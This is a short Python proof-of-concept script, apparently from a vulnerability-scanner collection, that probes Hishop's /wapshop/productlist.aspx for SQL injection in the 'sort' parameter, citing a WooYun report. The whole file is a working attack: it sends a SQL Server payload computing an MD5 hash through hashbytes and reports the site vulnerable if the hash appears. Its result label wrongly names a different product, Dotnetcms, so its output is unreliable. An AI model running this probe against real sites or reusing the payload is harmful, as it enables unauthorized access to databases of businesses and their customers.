#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Hishop系统productlist.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0154499
author: Lucifer
description: Hishop易分销系统/wapshop/productlist.aspx文件中参数sort存在注入
'''
import sys
import requests
import warnings
def run(url):
        result = ['Dotnetcms(风讯cms)SQL注入漏洞','','']
        payload = "/wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)))"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
